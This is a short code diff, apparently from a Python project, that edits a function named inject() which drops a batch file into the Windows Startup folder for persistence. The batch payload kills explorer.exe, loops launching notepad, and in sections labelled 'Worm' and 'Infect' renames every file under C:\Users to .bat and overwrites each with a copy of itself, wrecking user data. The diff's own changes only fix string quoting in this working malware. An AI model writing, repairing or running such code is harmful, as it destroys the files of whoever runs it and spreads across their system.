@@ -22,7 +22,7 @@ def inject():
 
 	os.chdir(rf'C:\Users\{username1}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
 	file=open('activated.bat', "w")
-	file.write('''@echo off
+	file.write(r'''@echo off
 taskkill /f /im explorer.exe
 :top
 START %SystemRoot%\system32\notepad.exe
@@ -59,7 +59,7 @@ goto Worm
 rem <=== infect *.* in C:\Users ===>
 :Infect
 for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.bat)
-for /f %%f in ('dir C:\Users\*.bat /s /b') do (copy %0 %%f)''' +"\n")
+for /f %%f in ('dir C:\Users\*.bat /s /b') do (copy %0 %%f)''')
 
 
 
